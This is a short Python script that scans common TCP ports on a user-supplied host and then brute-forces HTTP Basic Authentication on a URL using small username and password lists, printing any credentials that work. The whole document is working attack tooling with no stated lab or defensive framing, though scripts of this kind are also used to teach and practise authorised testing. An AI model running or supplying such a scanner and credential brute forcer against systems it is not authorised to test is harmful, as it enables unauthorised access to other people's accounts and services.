import socket
import requests

def port_scanner(target, ports=[21, 22, 80, 443, 3306]):
    """Scan common ports on target host."""
    print(f"\n--- Scanning ports on {target} ---")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port}: OPEN")
        else:
            print(f"Port {port}: CLOSED")
        sock.close()

def brute_force_http(url, usernames, passwords):
    """Basic HTTP Auth brute forcer."""
    print(f"\n--- Brute-forcing HTTP Basic Auth on {url} ---")
    for user in usernames:
        for pwd in passwords:
            try:
                res = requests.get(url, auth=(user, pwd))
                if res.status_code == 200:
                    print(f"[SUCCESS] Username: {user} | Password: {pwd}")
                    return
            except Exception as e:
                print(f"Error: {e}")
    print("Brute-force finished.")

if __name__ == "__main__":
    target_ip = input("Enter target IP/domain: ")
    port_scanner(target_ip)

    usernames = ["admin", "user"]
    passwords = ["admin", "1234", "password"]
    url = "http://example.com/protected"
    brute_force_http(url, usernames, passwords)
